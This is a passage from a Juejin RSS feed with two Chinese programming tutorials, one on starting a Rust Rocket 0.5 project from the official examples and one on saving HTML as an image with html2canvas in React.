<li>把示例代码 copy 到你自己的项目目录，然后调整 <code>Cargo.toml</code>（推荐）</li>
</ol>
<h3 data-id="heading-6">3.1 新建一个自己的项目目录</h3>
<p>比如你想写一个自己的 Rocket 服务叫 <code>my-rocket-app</code>：</p>
<pre><code class="hljs language-bash" lang="bash">cargo new my-rocket-app --bin
<span class="hljs-built_in">cd</span> my-rocket-app
</code></pre>
<p>这会生成一个标准的 Rust 二进制项目结构：</p>
<pre><code class="hljs language-text" lang="text">my-rocket-app
├── Cargo.toml
└── src
    └── main.rs
</code></pre>
<h3 data-id="heading-7">3.2 修改 Cargo.toml：依赖 Rocket 0.5</h3>
<p>将 <code>Cargo.toml</code> 改成类似这样（根据需求添加 features）：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"my-rocket-app"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { version = <span class="hljs-string">"0.5.1"</span>, features = [<span class="hljs-string">"json"</span>, <span class="hljs-string">"secrets"</span>] }
<span class="hljs-comment"># 如果你需要模板：</span>
<span class="hljs-comment"># rocket_dyn_templates = { version = "0.2.0", features = ["tera"] }</span>
<span class="hljs-comment"># 如果你需要数据库池：</span>
<span class="hljs-comment"># rocket_sync_db_pools = "0.1.0"</span>
</code></pre>
<p>注意两点：</p>
<ol>
<li>这里的 <code>rocket</code> 不再是指向本地源码，而是正常从 crates.io 拉取；</li>
<li>你需要手动补上之前示例中依赖的功能（比如 <code>json</code> / <code>secrets</code> / 模板等）。</li>
</ol>
<h3 data-id="heading-8">3.3 复制示例代码到自己的 main.rs</h3>
<p>比如你喜欢 <code>examples/hello/src/main.rs</code> 中的写法，就可以直接 copy 内容到自己的 <code>src/main.rs</code>，然后稍作修改，变成你自己的版本。</p>
<p>一个最迷你的 Rocket 0.5 <code>main.rs</code> 大致像这样：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, Rocket 0.5!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>然后在你自己的项目目录下执行：</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>如果能正常启动、返回了你期望的内容，说明你已经<strong>从“跑官方 demo”成功迈进到“有自己项目”这一步</strong>。</p>
<h2 data-id="heading-9">四、常见疑问：示例的 Cargo.toml 和我自己的有什么区别？</h2>
<p>看 examples 目录时你可能会发现：
示例里的 <code>Cargo.toml</code> 不是直接写 <code>rocket = "0.5.1"</code>，而是用本地路径依赖，比如：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { path = <span class="hljs-string">"../../core/lib"</span>, features = [<span class="hljs-string">"json"</span>] }
</code></pre>
<p>这是因为：</p>
<ul>
<li>examples 需要在 <strong>Rocket 仓库内部</strong>直接编译、调试；</li>
<li>官方开发者会在本地反复修改 Rocket 源码并及时验证示例是否还能跑通；</li>
<li>为了保证一致性，示例直接依赖仓库内的源码，而不是 crates.io 上的版本。</li>
</ul>
<p>而你建自己的项目时，<strong>不应该继续用 path 依赖</strong>，而是像正常 Rust 项目一样指定版本号，这样：</p>
<ul>
<li>构建、部署过程更标准；</li>
<li>不用带着整个 Rocket 仓库一起走；</li>
<li>升级 Rocket 时只需要改 <code>Cargo.toml</code> 即可。</li>
</ul>
<h2 data-id="heading-10">五、总结：Quickstart 的“推荐路线图”</h2>
<p>可以把 Rocket 0.5 的快速上手路线总结成 4 步：</p>
<ol>
<li>
<p><strong>装 Rust 工具链（rustup）</strong></p>
</li>
<li>
<p><strong>克隆 Rocket 仓库并切到 v0.5</strong></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
git checkout v0.5
</code></pre>
</li>
<li>
<p><strong>进 examples 跑 demo</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
</li>
<li>
<p><strong>新建自己的项目，用示例代码做模板</strong></p>
<ul>
<li><code>cargo new my-rocket-app --bin</code></li>
<li>调整 <code>Cargo.toml</code> 依赖 <code>rocket = { version = "0.5.1", features = [...] }</code></li>
<li>把示例里你喜欢的 main / routes 复制过来改一改</li>
</ul>
</li>
</ol>
<p>做到这里，你已经完成了 Rocket 的“冷启动”：
从零 → 跑 demo → 拥有自己的项目。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[将html转化成图片]]></title>    <link>https://juejin.cn/post/7581786379803377699</link>    <guid>https://juejin.cn/post/7581786379803377699</guid>    <pubDate>2025-12-10T02:33:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581786379803377699" data-draft-id="7581750253000540195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="将html转化成图片"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T02:33:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小明记账簿_微信小程序"/> <meta itemprop="url" content="https://juejin.cn/user/1901536389893546"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            将html转化成图片
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1901536389893546/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小明记账簿_微信小程序
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:33:14.000Z" title="Wed Dec 10 2025 02:33:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>如何将指定html内容转化成图片保存？这个问题很值得深思，实际应用中也很有价值。最直接的想法就是使用<code>canvas</code>，熟悉<code>canvas</code>的同学可以尝试一下。这里不做太多的说明，本文采用<code>html2canvas</code>库来实现。</p>
</blockquote>
<p><code>html2canvas</code>库的使用非常简单，只需要引入<code>html2canvas</code>库，然后调用<code>html2canvas</code>方法即可，<a href="https://link.juejin.cn?target=http%3A%2F%2Fhtml2canvas.hertzen.com%2F" target="_blank" title="http://html2canvas.hertzen.com/" ref="nofollow noopener noreferrer">官方地址</a>。</p>
<p>接下来说一下简单的使用，以<code>react</code>项目为例。</p>
<p>获取整个页面截图，可以使用底层ID<code>root</code>，这样下载的就是<code>root</code>下的所有元素。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d282e459eb14541870200efc3001db0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=Zdrj6WPwaUNGC5R0tZi5F%2FfG1K8%3D" width="50%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> html2canvas <span class="hljs-keyword">from</span> <span class="hljs-string">"html2canvas"</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">saveCanvas</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 画布基础元素，要绘制的元素</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"root"</span>);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span> };
    <span class="hljs-title function_">html2canvas</span>(canvas, options).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">canvas</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> type = <span class="hljs-string">"png"</span>;
      <span class="hljs-comment">// 返回值是一个数据url，是base64组成的图片的源数据</span>
      <span class="hljs-keyword">let</span> imgDt = canvas.<span class="hljs-title function_">toDataURL</span>(type);
      <span class="hljs-keyword">let</span> fileName = <span class="hljs-string">"img"</span> + <span class="hljs-string">"."</span> + type;
      <span class="hljs-comment">// 保存为文件</span>
      <span class="hljs-keyword">let</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
      a.<span class="hljs-property">href</span> = imgDt;
      a.<span class="hljs-property">download</span> = fileName;
      a.<span class="hljs-title function_">click</span>();
    });
  };
</code></pre>
<p>图片的默认背景色是<code>#ffffff</code>，如果想要透明色可设置为<code>null</code>，比如设置为红色。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1c4b6bdfc054d8c8a800aa6a1030d70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=W3M6s470YEpjxNOJOSM3Z7HDX20%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">"red"</span> };
</code></pre>
<p>正常情况下网络图片是无法渲染的，可以使用<code>useCORS</code>属性，设置为<code>true</code>即可。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec958d764f54d9995584d094f67ffe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=%2FjVHD84CpZTrf7Y689JHuLKYaFo%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span> };
</code></pre>
<p>保存某块元素的截图</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a80dadfbdb4f4c5d9f61cd5fb538143e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=GWOn%2Bc8dIJ2ikH4Av9OzV64rkUU%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"swiper"</span>);
</code></pre>
<p>如果希望将某些元素排除，可以将<code>data-html2canvas-ignore</code>属性添加到这些元素中，<code>html2canvas</code>将从渲染中排除这些元素。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fcc603cf51e467b9dd3fecc7766833a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=mGLMC3Ubuynj3KpwUd10a5XjygE%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
  <span class="hljs-attr">data-html2canvas-ignore</span>
  <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
  <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>
  <span class="hljs-attr">onClick</span>=<span class="hljs-string">{saveCanvas}</span>
&gt;</span>
  download
<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
</code></pre>
<p>完整代码</p>
<pre><code class="hljs language-js" lang="js">npm install html2canvas
</code></pre>
<pre><code class="hljs language-css" lang="css">// demo<span class="hljs-selector-class">.less</span>
<span class="hljs-selector-class">.contentSwiper</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">710px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">375px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffffff</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">48px</span>;
  user-select: none;
}
<span class="hljs-selector-class">.swiper</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span>, <span class="hljs-title class_">Space</span>, <span class="hljs-title class_">Swiper</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd-mobile"</span>;
<span class="hljs-keyword">import</span> html2canvas <span class="hljs-keyword">from</span> <span class="hljs-string">"html2canvas"</span>;
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">"./demo.less"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">saveCanvas</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 画布基础元素，要绘制的元素</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"root"</span>);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">"red"</span>
  };
    <span class="hljs-title function_">html2canvas</span>(canvas, options).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">canvas</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> type = <span class="hljs-string">"png"</span>;
      <span class="hljs-comment">// 返回值是一个数据url，是base64组成的图片的源数据</span>
      <span class="hljs-keyword">let</span> imgDt = canvas.<span class="hljs-title function_">toDataURL</span>(type);
      <span class="hljs-keyword">let</span> fileName = <span class="hljs-string">"img"</span> + <span class="hljs-string">"."</span> + type;
      <span class="hljs-comment">// 保存为文件</span>
      <span class="hljs-keyword">let</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
      a.<span class="hljs-property">href</span> = imgDt;
      a.<span class="hljs-property">download</span> = fileName;
      a.<span class="hljs-title function_">click</span>();
    });
  };
  <span class="hljs-keyword">const</span> <span class="hljs-attr">colors</span>: string[] = [<span class="hljs-string">"#ace0ff"</span>, <span class="hljs-string">"#bcffbd"</span>, <span class="hljs-string">"#e4fabd"</span>, <span class="hljs-string">"#ffcfac"</span>];
  <span class="hljs-keyword">const</span> items = colors.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">color, index</span>) =&gt;</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Swiper.Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.contentSwiper}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">background:</span> <span class="hljs-attr">color</span> }}&gt;</span>
        {index + 1}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Swiper.Item</span>&gt;</span></span>
  ));
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"content"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"swiper"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.swiper}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Swiper</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
            "<span class="hljs-attr">--track-padding</span>"<span class="hljs-attr">:</span> " <span class="hljs-attr">0</span> <span class="hljs-attr">0</span> <span class="hljs-attr">16px</span>",
          }}
          <span class="hljs-attr">defaultIndex</span>=<span class="hljs-string">{1}</span>
        &gt;</span>
          {items}
        <span class="hljs-tag">&lt;/<span class="hljs-name">Swiper</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">width</span>=<span class="hljs-string">{200}</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">"https://t7.baidu.com/it/u=2621658848,3952322712&amp;fm=193&amp;f=GIF"</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Space</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
          <span class="hljs-attr">data-html2canvas-ignore</span>
          <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
          <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{saveCanvas}</span>
        &gt;</span>
          download
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>&gt;</span>
          Solid
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"outline"</span>&gt;</span>
          Outline
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>&gt;</span>
          None
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Space</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>